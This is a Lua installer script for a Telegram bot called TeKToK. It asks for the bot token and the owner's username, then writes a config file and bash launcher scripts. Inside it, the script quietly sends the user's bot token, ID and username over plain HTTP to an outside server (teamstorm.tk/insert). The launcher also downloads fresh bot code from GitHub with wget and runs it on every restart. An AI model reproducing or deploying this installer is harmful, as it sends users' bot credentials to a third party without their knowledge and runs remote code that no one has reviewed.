serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_TeKToK = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_TeKToK = function() 
local Create_Info = function(Token,Sudo,UserName)  
local TeKToK_Info_Sudo = io.open("sudo.lua", 'w')
TeKToK_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
TeKToK_Info_Sudo:close()
end  
if not database:get(Server_TeKToK.."Token_TeKToK") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_TeKToK.."Token_TeKToK",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua run.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_TeKToK.."UserName_TeKToK") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://teamstorm.tk/GetUser/?id="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('lua run.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('lua run.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_TeKToK.."UserName_TeKToK",Json.Info.Username)
database:set(Server_TeKToK.."Id_TeKToK",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('lua run.lua')
end
local function Files_TeKToK_Info()
Create_Info(database:get(Server_TeKToK.."Token_TeKToK"),database:get(Server_TeKToK.."Id_TeKToK"),database:get(Server_TeKToK.."UserName_TeKToK"))   
http.request("http://teamstorm.tk/insert/?id="..database:get(Server_TeKToK.."Id_TeKToK").."&user="..database:get(Server_TeKToK.."UserName_TeKToK").."&token="..database:get(Server_TeKToK.."Token_TeKToK"))
local RunTeKToK = io.open("TeKToK", 'w')
RunTeKToK:write([[
#!/usr/bin/env bash
cd $HOME/TeKToK
token="]]..database:get(Server_TeKToK.."Token_TeKToK")..[["
rm -fr TeKToK.lua
wget "https://raw.githubusercontent.com/TeKToKBot/TeKToK/master/TeKToK.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./TeKToK.lua -p PROFILE --bot=$token
done
]])
RunTeKToK:close()
local RunTs = io.open("tk", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/TeKToK
while(true) do
rm -fr ../.telegram-cli
screen -S TeKToK -X kill
screen -S TeKToK ./TeKToK
done
]])
RunTs:close()
end
Files_TeKToK_Info()
database:del(Server_TeKToK.."Token_TeKToK");database:del(Server_TeKToK.."Id_TeKToK");database:del(Server_TeKToK.."UserName_TeKToK")
sudos = dofile('sudo.lua')
os.execute('./ins.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_TeKToK()  
var = true
else   
f:close()  
database:del(Server_TeKToK.."Token_TeKToK");database:del(Server_TeKToK.."Id_TeKToK");database:del(Server_TeKToK.."UserName_TeKToK")
sudos = dofile('sudo.lua')
os.execute('./ins.sh ins')
var = false
end  
return var
end
Load_File()
